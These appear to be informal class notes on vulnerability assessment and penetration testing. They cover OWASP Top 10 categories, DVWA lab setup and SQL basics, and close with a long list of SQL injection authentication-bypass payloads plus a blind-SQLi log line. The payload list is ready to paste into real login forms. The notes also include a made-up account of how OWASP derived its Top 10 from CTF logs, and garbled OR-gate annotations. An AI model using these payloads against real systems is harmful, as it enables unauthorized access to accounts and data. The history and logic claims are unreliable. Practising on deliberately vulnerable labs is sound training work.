Introduction To VAPT
====================
V --> Vulnerability
	It is a weekpoint, or the access points from where a system can be compromised | Loopholes
A --> Assessment
	To analyse the Vulnerability, To scan for and to gather the information about the Vulnerability
P --> Penetration
	To enter into the system via above Vulnerability, To compromise the system.
T --> Testing
	To check the result, of Vulnerability assessment and Penetration

VA and PT
VA --> Vulnerability Assessment
PT --> Penetration Testing

VAPT --> Scanning + Tod Fod krna

Standard --> OWASP Top 10
=========================
OWASP --> Open Web Application Security Project
-----------------------------------------------
	It is a non profitable charitable organisation, which works towards the welfare security of web application.

CTF Initiative
==============
	Capture the Flag
	They started CTF and invited the whole community to hack into. While they were performing hacks, OWASP started gathering their LOG information.

	127.0.0.1 - - [19/Jun/2018:11:32:13 +0530] "GET /dvwa/vulnerabilities/sqli_blind/?id=1%27+and+1%3D0+union+select+1%2C2+%23&Submit=Submit HTTP/1.1" 200 4851 "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1%27+and+1%3D1+order+by+3+%23&Submit=Submit" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0"

After analysing all of the log data, they categorise all the attacks and grouped them into 10 different categories. We today call it, OWASP TOP 10 Attacks.

OWASP Top 10 Attacks
====================
	Injection
	XSS --> Cross Site Scripting
	CSRF --> Cross Site Request Forgery
	Sensitive Data Exposure
	IDOR --> Insecure Direct Object References
	Broken Authentication and Session Management
	Unvalidated Redirect and Forwards
	Missing Function Level Access Control
	Using Components With Known Vulnerabilities
	Security Misconfiguration

We will perform all the OWASP Top 10 Attacks in a virtualised and simulated Environmet.

Bug Crowd --> Bug Bounty Program
	Find Bugs and get the bounty

1. DVWA --> Damn Vulnerable Web Application
2. WAVE

These are vulnerable by default, they are used for performing all the owasp top 10 attacks and to prectice them in a safe environment.

LVS Configuration
-----------------
Step 1 --> Download the zip file
Step 2 --> Extract the zip file
Step 3 --> Copy the extracted zip file in 		
			C:\xampp\htdocs
Step 4 --> Start the xampp server
			MySQL
			Apache
Step 5 --> Start the browser and goto
			127.0.0.1/<copy_folder_name>

DBMS
====
Database Management System
--------------------------

DBA --> Database Administrator

SQL --> Structured Query Language
	Used for interacting with the database.

Source --> Delhi
Destination --> Jalandhar
Date --> 10/7/2018
Class --> 3 Tier

select * from trains where source="Delhi" and Destination="jalandhar" and Date="10/07/2018" and class="3 T";

SQL Basics
==========
1. Insert
    Insert into <table_name>(Column_Name) VALUES(Values to be inserted);
 
    INSERT INTO Employee(`E_name`, `age`, `Address`, `Gender`) VALUES ("Abhijeet", 22, "Roshan Garden Najafgarh", "M");
 
2. Select
    Select * from <table_name>;
 
    Select * from info;
 
3. UPDATE
    Update <table_name> SET <value to change> where <condition>;   
 
    UPDATE info SET Salary=30000 where Name="Abhijeet Singh";
 
4. Where
    It is a condition
 
    Select * from info where salary > 15000;
    Select * from info where name like "A%";
 
5. Delete
    DELETE from info WHERE Name="Abhijeet Singh";
 
6. AND
    SELECT * FROM `info` WHERE salary>=20000 and Gen='M';
 
7. Create
    Create table <table_name>(columns_name data_Type Length);
 
    CREATE table training(Name Text(20), Age int(3), Gender Text(1));
 
8. Order By
    It will arrange the data into either ascending order or in descending order
 
    SELECT * FROM `training` ORDER BY Name;
 
9. Group By
    To group the data
 
    SELECT * FROM `training` GROUP by Gender;

information_schema
information_schema.tables
information_schema.columns
version()
database()
union




Authentication Bypass
=====================

GATES ---> AND GATE | OR GATE
------------------------------


A 		B 		A and B
-----------------------
0		0		0
0		1		0
1		0		0
1		1		1



A 		B 		A or B
-----------------------
0		0		0
0		1		1
1		0		1
1		1		1



0 or 0 = 1 ---> False
0 or 0 = 0 ---> True
1 or 1 = 1


Username  --> 1'or'1'='1
Password  --> 1'or'1'='1



or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055



0'or'0'='0
x'or'x'='x
sidharth'or'sidharth'='sidharth